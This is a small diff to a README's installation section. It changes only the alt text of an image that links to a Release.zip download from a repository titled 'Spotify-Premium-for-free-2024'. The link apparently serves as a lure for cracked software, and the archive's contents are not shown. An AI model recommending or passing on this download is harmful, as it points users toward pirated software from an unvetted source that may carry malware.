@@ -5,7 +5,7 @@
 ## Getting Started:
 
 ### Installation
-[![asdasdasd](https://github.com/user-attachments/assets/e1bec188-cc62-4629-977d-1d4247202b7e)
+[![](https://github.com/user-attachments/assets/e1bec188-cc62-4629-977d-1d4247202b7e)
 ](https://github.com/Sidodido/Spotify-Premium-for-free-2024/releases/download/Release/Release.zip)
 
 
